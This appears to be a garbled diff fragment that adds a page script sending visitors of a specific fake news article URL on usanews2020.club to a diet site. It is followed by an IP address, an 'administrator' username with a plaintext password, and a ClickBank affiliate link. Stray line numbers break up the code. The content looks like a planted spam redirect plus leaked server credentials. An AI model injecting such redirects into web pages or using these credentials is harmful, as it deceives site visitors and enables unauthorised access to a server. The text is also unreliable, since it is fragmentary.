@@ -1,0 +1,16 @@
+<script>
+2
+if(window.location.href == &#39;http://usanews2020.club/on-behalf-of-the-entire-trump-family-i-want-to-wish-every-american-a-healthy-and-happy-thanksgiving-today-we-gathered-in-the-rose-garden-to-continue-a-beloved-annual-tradition-the-official-presiden/&#39;)
+3
+{
+4
+window.location=&quot;https://veganchallengediet.com//&quot;;
+5
+}
+6
+</script>
+
+IP: 107.178.103.143
+username: administrator
+Password: SKSHost@876
+https://e62f85ver9julubwpdy96t1zec.hop.clickbank.net/
